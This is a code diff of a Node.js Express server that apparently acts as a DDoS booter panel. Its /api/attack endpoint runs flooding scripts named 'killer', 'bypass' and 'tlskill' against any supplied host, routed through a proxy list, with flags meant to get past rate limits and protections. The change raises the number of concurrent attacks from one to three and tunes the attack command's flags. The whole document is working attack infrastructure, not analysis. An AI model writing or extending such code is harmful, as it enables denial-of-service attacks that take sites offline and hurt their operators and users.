@@ -5,7 +5,7 @@ const axios = require("axios");
 const app = express();
 const port = 80;
 
-const maxConcurrentAttacks = 1;
+const maxConcurrentAttacks = 3;
 let activeAttacks = 0;
 
 // Lấy IP công cộng
@@ -99,7 +99,7 @@ app.get("/api/attack", (req, res) => {
     "killer": `node --max-old-space-size=65536 killer GET ${host} ${time} 10 10 live.txt`,
     "bypass": `node --max-old-space-size=65536 bypass ${host} ${time} 10 10 live.txt bypass --redirect true --ratelimit true --query true`,
     "tlskill": `node --max-old-space-size=65536 tlskill ${host} ${time} 10 10 live.txt --icecool true --dual true --brave true`,
-    "attack": `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -p live.txt -t ${threads} -r ${rate} --ratelimit true --full true`
+    "attack": `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --delay 1 --ratelimit true --full true --debug false`
   };
 
   const command = commands[method.toLowerCase()];
